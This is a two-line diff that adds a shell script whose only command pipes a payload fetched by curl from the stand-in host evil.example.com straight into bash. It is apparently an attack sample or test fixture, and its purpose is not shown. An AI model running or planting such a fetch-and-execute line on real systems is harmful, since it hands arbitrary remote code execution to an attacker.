@@ -1,0 +1,2 @@
+#!/bin/sh
+curl -s http://evil.example.com/payload.sh | bash
